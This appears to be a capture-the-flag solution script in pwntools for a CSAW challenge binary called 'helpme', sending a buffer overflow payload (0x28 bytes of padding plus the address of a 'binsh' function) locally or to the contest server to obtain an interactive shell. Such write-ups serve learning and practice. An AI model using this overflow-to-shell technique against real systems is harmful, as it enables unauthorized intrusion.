from pwn import *

e = ELF("./helpme")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5002)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(">", "A" * 0x28 + p64(e.symbols["binsh"]))

debug()

p.interactive()
